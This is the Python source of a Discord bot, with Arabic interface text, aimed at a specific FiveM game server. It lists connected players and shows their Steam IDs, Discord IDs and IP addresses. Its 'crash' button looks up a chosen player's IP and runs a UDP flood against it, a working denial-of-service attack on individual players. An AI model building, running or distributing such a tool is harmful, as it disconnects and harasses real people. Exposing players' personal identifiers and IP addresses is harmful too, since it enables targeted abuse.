import discord
from discord.ext import commands
import aiohttp
import os
import asyncio
import time
import socket
import random
import threading

# ============================================================
#  إعدادات
# ============================================================
SERVER_IP   = "194.45.197.196"
SERVER_PORT = "30120"
GUILD_ID    = 1510735912185630812

BASE_URL = f"http://{SERVER_IP}:{SERVER_PORT}/players.json"
INFO_URL = f"http://{SERVER_IP}:{SERVER_PORT}/info.json"

FETCH_TIMEOUT = 5
COLOR_DEFAULT = 0x1DA1F2
COLOR_ERROR   = 0xED4245
COLOR_SUCCESS = 0x57F287
COLOR_CRASH   = 0xFF0000

BANNER_URL = "https://media.discordapp.net/attachments/1275695804945793035/1511292593605181471/5dc9d6a7d1853123e5ec5c3017944906.webp"

# ============================================================
#  كرش حقيقي - UDP Flood
# ============================================================
def extract_ip_from_identifiers(identifiers: list) -> str:
    for ident in identifiers:
        if ident.startswith("ip:"):
            return ident.replace("ip:", "")
    return None

def udp_flood(target_ip: str, target_port: int, duration: float = 3):
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    while time.time() < end_time:
        try:
            data = random._urandom(1024)
            sock.sendto(data, (target_ip, target_port))
        except:
            pass
    sock.close()

def crash_player_real(target_ip: str, player_id: int, player_name: str) -> dict:
    if not target_ip:
        return {"success": False, "message": "لا يوجد IP لللاعب"}
    
    try:
        udp_flood(target_ip, int(SERVER_PORT), duration=3)
        udp_flood(target_ip, int(SERVER_PORT)+5, duration=2)
        
        print(f"[CRASH] {player_name} (ID:{player_id}) IP:{target_ip}")
        return {"success": True, "message": f"تم كرش {player_name}", "ip": target_ip}
    except Exception as e:
        return {"success": False, "message": str(e)}

# ============================================================
#  كاش
# ============================================================
_cache: dict = {}
CACHE_TTL = 8

def _get_cache(key: str):
    entry = _cache.get(key)
    if entry and time.monotonic() - entry["ts"] < CACHE_TTL:
        return entry["data"]
    return None

def _set_cache(key: str, data):
    _cache[key] = {"data": data, "ts": time.monotonic()}

# ============================================================
#  مساعدات
# ============================================================
def extract_identifier(identifiers: list, prefix: str):
    for i in identifiers:
        if i.startswith(prefix):
            return i.replace(prefix, "")
    return None

def error_embed(msg: str) -> discord.Embed:
    e = discord.Embed(title="SL6E BOT", description=msg, color=COLOR_ERROR)
    e.set_footer(text=f"{SERVER_IP}:{SERVER_PORT}")
    return e

def panel_embed() -> discord.Embed:
    embed = discord.Embed(title="🎮 SL6E BOT — لوحة التحكم", color=0x1B6FE4)
    embed.set_image(url=BANNER_URL)
    embed.set_footer(text="SL6E BOT")
    return embed

# ============================================================
#  جلب البيانات
# ============================================================
_HEADERS = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}

async def _fetch_json(url: str, cache_key: str):
    cached = _get_cache(cache_key)
    if cached is not None:
        return cached

    session = bot.session
    if session is None or session.closed:
        session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False))
        bot.session = session

    try:
        async with asyncio.timeout(FETCH_TIMEOUT):
            async with session.get(url, headers=_HEADERS) as r:
                if r.status == 200:
                    data = await r.json(content_type=None)
                    _set_cache(cache_key, data)
                    return data
    except:
        return None
    return None

async def fetch_players():
    return await _fetch_json(BASE_URL, "players")

async def fetch_info():
    return await _fetch_json(INFO_URL, "info")

# ============================================================
#  Modal البحث
# ============================================================
class SearchModal(discord.ui.Modal, title="🔎 بحث عن لاعب"):
    search_term = discord.ui.TextInput(
        label="اسم اللاعب أو ID",
        placeholder="اكتب الاسم أو الرقم",
        min_length=1,
        max_length=50,
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(thinking=True, ephemeral=True)
        term = self.search_term.value.strip()
        
        players = await fetch_players()
        if players is None:
            await interaction.followup.send(embed=error_embed("❌ فشل جلب البيانات"), ephemeral=True)
            return
        
        results = []
        if term.isdigit():
            target = next((p for p in players if p.get("id") == int(term)), None)
            if target:
                results.append(target)
        else:
            results = [p for p in players if term.lower() in p.get("name", "").lower()]
        
        if not results:
            await interaction.followup.send(embed=error_embed(f"❌ لا يوجد لاعب بـ {term}"), ephemeral=True)
            return
        
        if len(results) == 1:
            p = results[0]
            ids = p.get("identifiers", [])
            embed = discord.Embed(title="🔍 نتيجة البحث", color=COLOR_SUCCESS)
            embed.add_field(name="👤 الاسم", value=f"`{p.get('name','?')}`", inline=True)
            embed.add_field(name="🆔 ID", value=f"`{p.get('id','?')}`", inline=True)
            embed.add_field(name="📶 Ping", value=f"`{p.get('ping','?')} ms`", inline=True)
            embed.add_field(name="🟠 Steam", value=f"`{extract_identifier(ids,'steam:') or '—'}`", inline=True)
            embed.add_field(name="🔵 Discord", value=f"`{extract_identifier(ids,'discord:') or '—'}`", inline=True)
            embed.add_field(name="🌐 IP", value=f"`{extract_identifier(ids,'ip:') or '—'}`", inline=True)
            await interaction.followup.send(embed=embed, ephemeral=True)
        else:
            lines = "\n".join([f"[{p.get('id','?')}] {p.get('name','?')}" for p in results[:15]])
            embed = discord.Embed(title=f"🔎 نتائج: {term}", description=f"```yaml\n{lines}```", color=COLOR_SUCCESS)
            await interaction.followup.send(embed=embed, ephemeral=True)

# ============================================================
#  Modal الكرش
# ============================================================
class CrashModal(discord.ui.Modal, title="💥 كرش لاعب"):
    player_id = discord.ui.TextInput(
        label="ID اللاعب",
        placeholder="أدخل رقم ID",
        min_length=1,
        max_length=6,
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(thinking=True, ephemeral=True)
        
        try:
            target_id = int(self.player_id.value.strip())
        except ValueError:
            await interaction.followup.send(embed=error_embed("❌ ID غير صالح"), ephemeral=True)
            return
        
        players = await fetch_players()
        if players is None:
            await interaction.followup.send(embed=error_embed("❌ السيرفر غير متاح"), ephemeral=True)
            return
        
        target = next((p for p in players if p.get("id") == target_id), None)
        if not target:
            await interaction.followup.send(embed=error_embed(f"❌ لا يوجد لاعب ID {target_id}"), ephemeral=True)
            return
        
        player_name = target.get("name", "Unknown")
        identifiers = target.get("identifiers", [])
        player_ip = extract_identifier(identifiers, "ip:")
        
        result = crash_player_real(player_ip, target_id, player_name)
        
        embed = discord.Embed(
            title="💥 نتيجة الكرش",
            description=f"**{player_name}** (ID: {target_id})",
            color=COLOR_CRASH if result["success"] else COLOR_ERROR
        )
        embed.add_field(name="🌐 IP", value=f"`{player_ip or '—'}`", inline=True)
        embed.add_field(name="📋 الحالة", value=f"`{result['message']}`", inline=False)
        await interaction.followup.send(embed=embed, ephemeral=True)

# ============================================================
#  قائمة اللاعبين مع أزرار
# ============================================================
class PlayersListView(discord.ui.View):
    def __init__(self, players_data: list):
        super().__init__(timeout=60)
        self.players = players_data
        self.current_page = 0
        self.per_page = 10
        self.total_pages = max(1, (len(players_data) + self.per_page - 1) // self.per_page)
        self._update_buttons()
    
    def get_embed(self):
        start = self.current_page * self.per_page
        end = start + self.per_page
        chunk = self.players[start:end]
        
        embed = discord.Embed(title="🎮 قائمة اللاعبين", description=f"المتصلون: {len(self.players)}", color=COLOR_DEFAULT)
        
        for p in chunk:
            embed.add_field(
                name=f"🆔 {p.get('id', '?')}",
                value=f"👤 {p.get('name', '?')}\n📶 {p.get('ping', '?')}ms",
                inline=True
            )
        
        embed.set_footer(text=f"صفحة {self.current_page + 1}/{self.total_pages}")
        return embed
    
    def _update_buttons(self):
        self.prev.disabled = self.current_page == 0
        self.next.disabled = self.current_page >= self.total_pages - 1
    
    @discord.ui.button(label="◀️", style=discord.ButtonStyle.secondary)
    async def prev(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.current_page > 0:
            self.current_page -= 1
            self._update_buttons()
            await interaction.response.edit_message(embed=self.get_embed(), view=self)
    
    @discord.ui.button(label="▶️", style=discord.ButtonStyle.secondary)
    async def next(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.current_page < self.total_pages - 1:
            self.current_page += 1
            self._update_buttons()
            await interaction.response.edit_message(embed=self.get_embed(), view=self)
    
    @discord.ui.button(label="🔄 تحديث", style=discord.ButtonStyle.success)
    async def refresh(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        _cache.pop("players", None)
        fresh = await fetch_players()
        if fresh:
            self.players = fresh
            self.total_pages = max(1, (len(fresh) + self.per_page - 1) // self.per_page)
            self.current_page = min(self.current_page, self.total_pages - 1)
            self._update_buttons()
            await interaction.edit_original_response(embed=self.get_embed(), view=self)
        else:
            await interaction.followup.send(embed=error_embed("فشل التحديث"), ephemeral=True)

# ============================================================
#  اللوحة الرئيسية
# ============================================================
class PanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🎮 قائمة اللاعبين", style=discord.ButtonStyle.primary, row=0)
    async def btn_list(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        data = await fetch_players()
        if not data:
            await interaction.followup.send(embed=error_embed("لا يوجد لاعبين"), ephemeral=True)
            return
        await interaction.followup.send(embed=discord.Embed(title="🎮 جاري التحميل..."), view=PlayersListView(data), ephemeral=True)

    @discord.ui.button(label="🔍 بحث", style=discord.ButtonStyle.primary, row=0)
    async def btn_search(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(SearchModal())

    @discord.ui.button(label="📊 إحصائيات", style=discord.ButtonStyle.primary, row=0)
    async def btn_stats(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        data, info = await asyncio.gather(fetch_players(), fetch_info())
        if not data:
            await interaction.followup.send(embed=error_embed("السيرفر غير متاح"), ephemeral=True)
            return
        
        total = len(data)
        vars_ = (info or {}).get("vars", {})
        max_p = vars_.get("sv_maxClients", "?")
        srv_name = (info or {}).get("name", "FiveM Server")
        
        embed = discord.Embed(title="📊 إحصائيات", color=COLOR_DEFAULT)
        embed.add_field(name="🖥️ السيرفر", value=f"`{srv_name}`", inline=False)
        embed.add_field(name="👥 اللاعبين", value=f"`{total} / {max_p}`", inline=True)
        embed.add_field(name="🌐 العنوان", value=f"`{SERVER_IP}:{SERVER_PORT}`", inline=True)
        await interaction.followup.send(embed=embed, ephemeral=True)

    @discord.ui.button(label="💥 كرش", style=discord.ButtonStyle.danger, row=1)
    async def btn_crash(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(CrashModal())

    @discord.ui.button(label="ℹ️ مساعدة", style=discord.ButtonStyle.secondary, row=1)
    async def btn_help(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="ℹ️ المساعدة", color=COLOR_DEFAULT)
        embed.add_field(name="🎮 قائمة اللاعبين", value="عرض جميع اللاعبين المتصلين", inline=False)
        embed.add_field(name="🔍 بحث", value="البحث بالاسم أو ID", inline=False)
        embed.add_field(name="💥 كرش", value="كرش لاعب معين", inline=False)
        embed.add_field(name="📊 إحصائيات", value="حالة السيرفر", inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

# ============================================================
#  البوت
# ============================================================
class FiveMBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)
        self.session = None

    async def setup_hook(self):
        self.session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False))
        guild = discord.Object(id=GUILD_ID)
        self.tree.copy_global_to(guild=guild)
        synced = await self.tree.sync(guild=guild)
        print(f"✅ مزامنة {len(synced)} أمر")

    async def close(self):
        if self.session:
            await self.session.close()
        await super().close()

bot = FiveMBot()

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Streaming(name="BY SL6E & ABO 5LOOD | /لوحة", url="https://twitch.tv/placeholder"))
    print(f"✅ {bot.user.name} | {SERVER_IP}:{SERVER_PORT}")

@bot.tree.command(name="لوحة", description="🎮 لوحة تحكم السيرفر")
async def cmd_panel(interaction: discord.Interaction):
    await interaction.response.send_message(embed=panel_embed(), view=PanelView(), ephemeral=True)

# ============================================================
#  تشغيل البوت
# ============================================================
TOKEN = os.environ.get("DISCORD_TOKEN")
if TOKEN:
    bot.run(TOKEN)
else:
    print("❌ DISCORD_TOKEN غير موجود")
